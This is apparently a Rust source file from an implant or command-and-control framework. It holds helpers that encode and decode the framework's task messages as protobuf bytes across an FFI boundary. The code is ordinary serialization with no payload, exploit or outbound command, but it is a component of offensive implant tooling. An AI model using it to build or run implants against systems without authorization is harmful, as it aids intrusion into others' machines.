//! Spite encode/decode helpers for crossing the FFI boundary.

use malefic_proto::proto::implantpb::spite::Body;
use malefic_proto::proto::implantpb::{Spite, Status};
use prost::Message;

/// Encode a `Spite` into protobuf bytes.
pub fn encode_spite(spite: &Spite) -> Vec<u8> {
    spite.encode_to_vec()
}

/// Decode a `Spite` from protobuf bytes.
pub fn decode_spite(bytes: &[u8]) -> anyhow::Result<Spite> {
    Spite::decode(bytes).map_err(|e| anyhow::anyhow!("spite decode error: {}", e))
}

/// Wrap a `Body` into a `Spite` and encode to protobuf bytes.
pub fn encode_body(task_id: u32, body: Body) -> Vec<u8> {
    let spite = Spite {
        task_id,
        body: Some(body),
        status: Some(Status {
            task_id,
            status: 0,
            error: String::new(),
        }),
        ..Default::default()
    };
    spite.encode_to_vec()
}
